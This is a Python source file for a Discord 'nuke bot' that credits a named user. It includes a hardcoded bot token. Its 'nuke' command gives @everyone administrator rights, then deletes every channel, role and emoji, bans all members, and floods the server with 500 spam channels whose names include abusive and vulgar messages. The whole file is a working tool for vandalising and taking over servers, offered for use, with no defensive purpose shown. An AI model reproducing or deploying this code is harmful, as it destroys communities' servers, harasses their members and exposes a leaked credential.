import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "ODM2OTU2NjU3MzA5MDU3MDU2.YIlioQ._gfDS59pBAifTcwmvS4YObCyk04"

SPAM_CHANNEL = [
    " A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248 je Kralj", "popusimi",
    "A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248", "oops Beamed",
    "A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248 Beamed You",
    "owner da nam ga popusi", "Get beamed clowns",
    "Beamed by A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248", "oops got nuked",
    "ode server", "beamed by A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248",
    "sa ima buraz", "kinda got beamed by A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248"
]
SPAM_MESSAGE = ["@everyone svi brzzzoo https://discord.gg/eeZVGPNq"]

client = commands.Bot(command_prefix="*")


@client.event
async def on_ready():
    print(''' 
   
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
 ''')
    await client.change_presence(activity=discord.Game(
        name="Direct By A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." +
          Fore.RESET)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA +
                  f"{member.name}#{member.discriminator} Was banned" +
                  Fore.RESET)
        except:
            print(
                Fore.GREEN +
                f"{member.name}#{member.discriminator} Was unable to be banned."
                + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" +
                  Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("A͓̽g͓̽e͓̽n͓̽t͓̽ k͓̽a͓̽n͓̽e͓̽k͓̽i#0248")
            print(
                Fore.MAGENTA +
                f"{user.name}#{user.discriminator} Was successfully unbanned."
                + Fore.RESET)
        except:
            print(Fore.GREEN +
                  f"{user.name}#{user.discriminator} Was not unbanned." +
                  Fore.RESET)
    await guild.create_text_channel("vi ste carsijske kurave")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return
